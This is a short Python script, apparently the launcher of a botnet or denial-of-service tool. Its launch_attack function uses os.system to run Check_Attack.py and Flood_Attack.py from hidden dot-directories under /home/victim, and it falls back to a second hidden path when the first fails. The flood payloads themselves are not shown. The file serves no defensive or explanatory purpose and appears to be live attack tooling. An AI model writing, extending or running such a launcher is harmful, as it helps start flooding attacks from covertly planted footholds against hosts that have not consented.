import os


def launch_attack():
    os.system('/usr/bin/python /home/victim/.etc/.module/Check_Attack.py || ( /usr/bin/python /home/victim/.var/.module/Check_Attack.py )')
    os.system('/usr/bin/python /home/victim/.etc/.module/Flood_Attack.py || ( /usr/bin/python /home/victim/.var/.module/Flood_Attack.py )')


if __name__ == '__main__':
    launch_attack()
